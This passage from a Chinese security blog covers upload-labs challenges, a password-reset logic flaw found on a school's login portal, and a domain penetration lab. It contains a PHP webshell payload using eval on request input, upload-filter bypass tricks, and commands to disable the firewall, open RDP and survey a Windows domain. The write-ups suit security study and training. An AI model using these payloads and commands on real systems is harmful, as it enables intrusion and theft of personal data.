class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br>$img = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> ($y = <span class="hljs-number">0</span>; $y &lt; sizeof($p); $y += <span class="hljs-number">3</span>) &#123;<br>   $r = $p[$y];<br>   $g = $p[$y+<span class="hljs-number">1</span>];<br>   $b = $p[$y+<span class="hljs-number">2</span>];<br>   $color = imagecolorallocate($img, $r, $g, $b);<br>   imagesetpixel($img, round($y / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, $color);<br>&#125;<br><br>imagepng($img,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行上面脚本直接生成图片，上传即可</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916170941448.png" alt="image-20210916170941448"></p><blockquote><p>还有其他的图片木马生成方法，这里就没有一一尝试了</p></blockquote><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916171133418.png" alt="image-20210916171133418"></p><p>这里的检查方法是用户文件先上传到文件目录之后，再检查是否合法并执行删除操作，所以可以利用条件竞争的方法上传文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>; fputs(fopen(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo(); @eval($_GET[c]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用 burp 一边上传，然后使用 python 脚本持续访问，上传成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916172537339.png" alt="image-20210916172537339"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    $imgFileName =time();<br>    $u = <span class="hljs-keyword">new</span> MyUpload($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],$imgFileName);<br>    $status_code = $u-&gt;upload(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> ($status_code) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            $is_upload = <span class="hljs-literal">true</span>;<br>            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            $msg = <span class="hljs-string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>:<br>            $msg = <span class="hljs-string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-2</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，上传目录不可写。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-3</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-4</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，上传的文件过大。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-5</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-6</span>:<br>            $msg = <span class="hljs-string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            $msg = <span class="hljs-string">&#x27;未知错误！&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//myupload.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;<br>......<br>......<br>...... <br>  <span class="hljs-keyword">var</span> $cls_arr_ext_accepted = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br><br>......<br>......<br>......  <br>  <span class="hljs-comment">/** upload()</span><br><span class="hljs-comment">   **</span><br><span class="hljs-comment">   ** Method to upload the file.</span><br><span class="hljs-comment">   ** This is the only method to call outside the class.</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><br><span class="hljs-comment">  **/</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> $dir </span>)</span>&#123;<br>    <br>    $ret = <span class="hljs-keyword">$this</span>-&gt;isUploadedFile();<br>    <br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;setDir( $dir );<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;checkExtension();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;checkSize();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      $ret = <span class="hljs-keyword">$this</span>-&gt;checkFileExists();<br>      <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;move();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      $ret = <span class="hljs-keyword">$this</span>-&gt;renameFile();<br>      <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>      &#125;<br>    &#125;<br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br>......<br>......<br>...... <br>&#125;;<br><br><br></code></pre></td></tr></table></figure><blockquote><p>条件竞争与解析漏洞</p></blockquote><p>Apache1.x，2.x中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断，所以我们可以再 php 后随便加上一个没有的后缀，这样 Apache 就可以解析了，在文件重命名前将访问文件</p><p><a href="https://www.cnblogs.com/HelloCTF/p/13189084.html">https://www.cnblogs.com/HelloCTF/p/13189084.html</a></p><blockquote><p>这么多请求虚拟机有点受不了，原理方法就是这样</p></blockquote><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916174628402.png" alt="image-20210916174628402"></p><blockquote><p>听到 POST 就开始对 0x00 敏感了</p></blockquote><p>绕过方法：</p><ul><li>点绕过</li><li>::$DATA 绕过</li><li>空格绕过</li><li>大小写绕过</li><li>Apache 解析漏洞绕过</li><li>0x00 截断 （环境不支持）</li></ul><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916175255368.png" alt="image-20210916175255368"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916175230483.png" alt="image-20210916175230483"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916175620779.png" alt="image-20210916175620779"></p><ul><li>检查了 Content-Type</li><li>文件后缀</li></ul><p><code>explode(separator,string,limit)</code>函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。</p><p><code>end(array)</code>函数，输出数组中的当前元素和最后一个元素的值。</p><p><code>reset(array)</code>函数，把数组的内部指针指向第一个元素，并返回这个元素的值</p><p><code>count(array)</code>函数，计算数组中的单元数目，或对象中的属性个数</p><p>原理简单，不过多写了。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916180803908.png" alt="image-20210916180803908"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916180939375.png" alt="image-20210916180939375"></p><p>参考文章</p><p><a href="https://fuping.site/2018/06/04/upload-labs-writeup/">https://fuping.site/2018/06/04/upload-labs-writeup/</a></p><p><a href="https://threezh1.com/2019/04/16/Upload-labs-Writeup/#Pass-09">https://threezh1.com/2019/04/16/Upload-labs-Writeup/#Pass-09</a></p><p><a href="https://www.freebuf.com/articles/web/265245.html">https://www.freebuf.com/articles/web/265245.html</a></p><p><a href="https://www.mi1k7ea.com/2019/10/05/upload-labs-WriteUp/">https://www.mi1k7ea.com/2019/10/05/upload-labs-WriteUp/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;upload-labs&quot;&gt;&lt;a href=&quot;#upload-labs&quot; class=&quot;headerlink&quot; title=&quot;upload-labs&quot;&gt;&lt;/a&gt;upload-labs&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/lcdm12</summary>
      
    
    
    
    
    <category term="靶场" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>某学院的统一认证登录网站渗透</title>
    <link href="http://example.com/2021/09/03/SRC%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/09/03/SRC%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-09-03T06:14:14.000Z</published>
    <updated>2021-09-26T16:38:16.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><blockquote><p>这里选择的SRC平台是教育SRC，因为这个对于初期的挖洞比较友好，是个不错的练习平台。</p></blockquote><p>在某个学校的漏洞挖掘过程中，发现一个严重的逻辑漏洞，通过这个漏洞可以重置管理员的密码，从而获取到全校学生的敏感信息（姓名，学号，电话，身份证号码等）</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>查找到该学校网站的统一认证登录页面（目前基本所有的学校都采用了这样的统一登陆认证的方式，一个账户登录所有校园网站，这样虽然方便了学生但是也会造成一些安全隐患）</p><p>忘记登录密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210922102027284.png" alt="image-20210922102027284"></p><p>之后直接选择修改 admin 账户密码，然后邮箱直接填写自己的邮箱地址，发包抓返回包并且修改返回包内容</p><p><img src="D:\markdown\image-20210908102812208.png" alt="image-20210908102812208"></p><blockquote><p>这里报错的时候 code 的值为 1，所以我尝试将 1 修改为 0，绕过报错</p></blockquote><p>成功绕过，并且在自己邮箱获得了重置密码的邮件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210908102912925.png" alt="image-20210908102912925"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210908102957124.png" alt="image-20210908102957124"></p><p>然后直接修改密码就可以了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210908103030467.png" alt="image-20210908103030467"></p><p>登录后就是超级管理员权限了，并且可以在里面的某个系统中获取到学生敏感信息，而且还可以直接下载（下载是违法的，所以这里没有下载信息）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210908103226873.png" alt="image-20210908103226873"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210908103246459.png" alt="image-20210908103246459"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这种漏洞虽然简单，但是却十分常见，可见现在的厂商产品安全保护做得有多差，漏洞厂商已经修复了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;逻辑漏洞&quot;&gt;&lt;a href=&quot;#逻辑漏洞&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞&quot;&gt;&lt;/a&gt;逻辑漏洞&lt;/h1&gt;&lt;h3 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h</summary>
      
    
    
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>Freebuf域渗透靶场</title>
    <link href="http://example.com/2021/09/02/Freebuf%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2021/09/02/Freebuf%E9%9D%B6%E5%9C%BA/</id>
    <published>2021-09-02T04:13:45.000Z</published>
    <updated>2021-09-22T02:05:18.712Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Freebuf-域渗透靶场"><a href="#Freebuf-域渗透靶场" class="headerlink" title="Freebuf 域渗透靶场"></a>Freebuf 域渗透靶场</h1><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p><a href="https://www.freebuf.com/articles/web/265049.html">https://www.freebuf.com/articles/web/265049.html</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/%E5%9F%9F%E6%A3%AE%E6%9E%97.png" alt="域森林"></p><p>搭建靶场就是一般步骤</p><p>需要注意的步骤</p><ol><li><p>修改父域的DNS设置</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802113055188.png" alt="image-20210802113055188"></p></li><li><p>财务域是一个单独的域环境，财务核心系统属于财务域</p></li><li><p>web服务器直接拿的红日改的，真方便</p></li></ol><p>经过后期的攻击，发现子域和父域之间存在一些问题，未找到原因！安装配置时只需要添加好网卡，自己增加用户即可</p><blockquote><p>虚拟机是真的卡…………两台电脑一起干最舒服</p></blockquote><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="外网攻击"><a href="#外网攻击" class="headerlink" title="外网攻击"></a>外网攻击</h3><blockquote><p>网站漏洞主要就是常见的：逻辑漏洞，弱口令，信息泄露，SQL注入，文件上传，命令执行，文件包含，XSS……</p></blockquote><p>拿到网站，首先看登录点，找一下是否存在管理员登录入口（对于已知的CMS可以直接上网查），扫描目录的时候需要控制频率不然容易被封IP，可以找cms的历史漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802172029664.png" alt="image-20210802172029664"></p><p>直接找到后台登录点</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802171633017.png" alt="image-20210802171633017"></p><p>这里种情况就先找一下网站是否有默认账户密码，万能密码，SQL注入等，上面有默认密码所以直接尝试</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802172221644.png" alt="image-20210802172221644"></p><p>登录成功，找到可以获取shell的点，前台模板处找到一个可以直接写入PHP的点，上传木马，下一步需要找到马的位置，查找网上CMS的网站目录然后找出文件位置（推荐）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802172701737.png" alt="image-20210802172701737"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802173539349.png" alt="image-20210802173539349"></p><p>连接木马，开始内网渗透</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802173703124.png" alt="image-20210802173703124"></p><h3 id="内网攻击"><a href="#内网攻击" class="headerlink" title="内网攻击"></a>内网攻击</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><blockquote><p>第一次写，各种信息收集的命令都写一下</p></blockquote><h5 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h5><ol><li><p>获取IP信息（是否有内网IP）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802174344376.png" alt="image-20210802174344376"></p></li><li><p>查看本机权限（为了后期提权）：<code>whoami</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802173929555.png" alt="image-20210802173929555"></p></li><li><p>查看系统信息（查看是否有域环境，获取补丁信息，系统版本等信息）：<code>systeminfo</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802174020113.png" alt="image-20210802174020113"></p><blockquote><p>发现有域就可以进一步收集内网信息了，如果只有一个机器就直接提权然后就基本没有什么其他的事情了</p></blockquote></li><li><p>查看开放的端口（主要注意远程连接端口（22   3389）和可以利用的漏洞的端口）：<code>netstat -ano</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802180609270.png" alt="image-20210802180609270"></p></li><li><p>确定当前服务器是否有杀软（后期为工具做免杀）：<code>tasklist</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802174237882.png" alt="image-20210802174237882"></p></li><li><p>获取当前开启的服务（可能有服务能帮助提权）：<code>wmic service list brief</code>         <code>net start</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802175159585.png" alt="image-20210802175159585"></p></li><li><p>查看系统开机时间：<code>net statistics workstation</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802175707265.png" alt="image-20210802175707265"></p></li><li><p>查看启动程序信息：<code>wmic startup get command,caption</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803095350375.png" alt="image-20210803095350375"></p></li><li><p>查询本机上用户列表（没有包含域用户）：<code>net user</code> </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803095935390.png" alt="image-20210803095935390"></p></li><li><p>获取本地管理员（包含域管理员）信息：<code>net localgroup administrators</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803100235551.png" alt="image-20210803100235551"></p></li><li><p>查询本机共享列表：<code>net share</code>    <code>wmic share get name,path,status</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803100551173.png" alt="image-20210803100551173"></p><blockquote><p>可以进行IPC等内网操作</p></blockquote></li><li><p>查询路由表及arp缓存表：<code>route print</code>  <code>arp -a</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803100836885.png" alt="image-20210803100836885"></p></li><li><p>关闭防火墙（需要管理员权限）：<code>netsh advfirewall set allprofiles state off</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803101029730.png" alt="image-20210803101029730"></p></li><li><p>查看防火墙配置：<code>netsh firewall show config</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803101228040.png" alt="image-20210803101228040"></p></li><li><p>开启远程端口（需要管理员权限）：<code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803101516401.png" alt="image-20210803101516401"></p></li><li><p>查看远程连接端口：<code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></p></li></ol><blockquote><p>前期的本地信息收集包含计算机系统版本，网卡路由，防火墙信息，补丁，域，ARP缓存，路由，用户列表，管理员权限用户，也需要注意电脑上存有的敏感信息的文件</p><p>也有自动信息收集工具懒🐕可以考虑一下</p></blockquote><h5 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h5><h6 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a><strong>基本信息收集</strong></h6><blockquote><p>由上面的本地信息收集得知存在域，所以就继续进行域渗透</p></blockquote><ol><li><p>查看当前权限获取域SID（SID对域渗透有帮助）：<code>whoami /all</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803102458768.png" alt="image-20210803102458768"></p></li><li><p>查询当前登录域及登录用户信息：<code>net config workstation</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803102759673.png" alt="image-20210803102759673"></p></li><li><p>查看当前所属域（域控服务器会同时作为时间服务器使用）：<code>net time /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803102949200.png" alt="image-20210803102949200"></p></li><li><p>探测域内存活主机</p><ul><li><p>利用<code>nbtscan</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803103742640.png" alt="image-20210803103742640"></p><blockquote><p>发现三个域控</p></blockquote></li><li><p>利用ICMP协议探测：<code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803104932946.png" alt="image-20210803104932946"></p></li><li><p>ARP扫描内网</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803104457305.png" alt="image-20210803104457305"></p><blockquote><p>收集到的存活主机信息：</p><p>10.10.3.5    LCDM123\MAINYU         SHARING DC</p><p>10.10.3.6    XIAOYU\ZIYU           SHARING DC</p><p>10.10.3.7    LCDM123\FUZHU          SHARING DC</p><p>10.10.3.128   XIAOYU\WEB           SHARING</p><p>10.10.3.16</p></blockquote></li></ul></li><li><p>主机端口信息收集</p><ul><li><p>telnet端口信息收集：<code>telnet ip port</code></p><blockquote><p>常见端口：22,80-89,110,389,1099,1433,2059,6379,7001,8080,1521,3306,3389,5432,53,161,137,139</p><p>这个方法比较慢，但是准确</p></blockquote></li><li><p>S扫描器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803110805230.png" alt="image-20210803110805230"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803110815940.png" alt="image-20210803110815940"></p><blockquote><p>扫描结果不是很齐全</p></blockquote></li><li><p>nmap（这个搭建代理再扫描内网比较方便）</p></li><li><p>使用Nishang</p></li><li><p>使用MSF</p></li><li><p>…………</p></li></ul></li><li><p>获取端口的Banner信息（客户端连接工具，NC）</p></li></ol><h6 id="域用户信息收集"><a href="#域用户信息收集" class="headerlink" title="域用户信息收集"></a><strong>域用户信息收集</strong></h6><ol><li><p>查询域：<code>net view /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803112637819.png" alt="image-20210803112637819"></p></li><li><p>查询域内所有计算机：<code>net view /domain:XIAOYU</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803112659327.png" alt="image-20210803112659327"></p></li><li><p>查询域内所有用户组列表：<code>net group /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803112758051.png" alt="image-20210803112758051"></p><blockquote><p>默认情况下Domain Admins和Enterprise Admins对域内所有域控制器有完全控制权限</p></blockquote></li><li><p>查询域内所有用户列表：<code>net group &quot;domain computers&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113031102.png" alt="image-20210803113031102"></p></li><li><p>域密码策略：<code>net accounts /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113147707.png" alt="image-20210803113147707"></p></li><li><p>获取域信任信息：<code>nltest /domain_trusts</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113417757.png" alt="image-20210803113417757"></p><blockquote><p>win7 这个命令不行？？？？</p></blockquote></li><li><p>查找域控（需要属于域内的用户运行）：<code>net time /domain</code> </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803114605145.png" alt="image-20210803114605145"></p></li><li><p>查看域控制器组：<code>net group &quot;domain controllers&quot; /domain</code></p><p><img 